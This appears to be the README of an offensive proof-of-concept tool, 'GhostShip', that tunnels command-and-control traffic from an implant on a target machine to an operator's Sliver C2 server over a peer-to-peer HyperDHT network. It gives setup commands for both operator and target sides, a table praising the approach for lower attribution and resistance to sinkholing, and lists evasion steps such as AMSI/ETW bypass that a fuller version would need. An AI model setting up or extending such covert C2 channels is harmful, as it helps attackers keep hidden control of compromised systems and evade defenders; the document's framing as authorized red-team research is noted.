# GhostShip 👻🚢

P2P tunnel for C2 traffic over [HyperDHT](https://github.com/holepunchto/hyperdht).

> **⚠️ Proof of Concept** — validates transport concept only. Not stealthy, detected by EDR/XDR.

---

## How It Works

```
[Target]                                      [Operator]

  Implant                                      C2 Server
     |                                            |
     v                                            v
 127.0.0.1:8888                              127.0.0.1:8888
     |                                            |
     v                                            v
  Client  <-----------P2P/DHT------------>    Bridge
```

1. **Bridge** connects to local C2 server, exposes it via DHT, outputs key (`hs://...`)
2. **Client** connects to DHT with key, opens local port
3. Implant connects to localhost, traffic tunnels through P2P

---

## Quick Start

**Operator:**
```bash
sliver-server                              # Start C2
sliver > mtls --lport 8888

cd bridge/nodejs && npm install
node bridge.js --port 8888                 # Note: hs://...
```

**Target:**
```bash
cd client && npm install
node client.js --connect "hs://..." --port 8888

./implant                                  # Connects to 127.0.0.1:8888
```

---

## Traditional C2 vs P2P C2

| Aspect | Traditional C2 | P2P C2 |
|--------|---------------|--------|
| **Infrastructure** | VPS, domains, static IPs | None (public DHT) |
| **Cost** | $10-100+/month | Free |
| **Setup time** | Hours/days | Seconds |
| **Single point of failure** | Yes (server) | No |
| **Attribution** | WHOIS, IP, hosting logs | Lower (DHT layer) |
| **Sinkholing risk** | Domains seizeable | No DNS to seize |
| **NAT traversal** | Redirectors needed | Built-in hole-punching |
| **Encryption** | Implementation-dependent | E2E default (Noise) |
| **Latency** | Low, predictable | Higher, variable |
| **Offline queuing** | Yes | No (both online required) |
| **Bootstrap dependency** | None | DHT nodes (blockable) |
| **Traffic fingerprint** | Known IPs/domains | DHT patterns detectable |
| **Protocol signature** | JA3 fingerprintable | Noise also fingerprintable |
| **Tooling maturity** | Established | Emerging |
| **Debugging** | Straightforward | Complex (distributed) |
| **Multi-operator** | Teamserver features | Requires custom impl |

**Bottom line:** P2P eliminates infrastructure but adds latency and complexity. Traditional C2 is mature and reliable but requires operational security for infrastructure. Choose based on your threat model.

---

## About This PoC

This PoC validates that HyperDHT can transport C2 traffic. It's a Node.js wrapper—not operationally viable.

A native P2P C2 would need: small binary, process injection, in-memory IPC, evasion (AMSI/ETW bypass). This PoC has visible processes, open ports, ~70MB footprint, zero evasion.

---

## Disclaimer

Authorized security research only. Unauthorized access is illegal.

MIT License
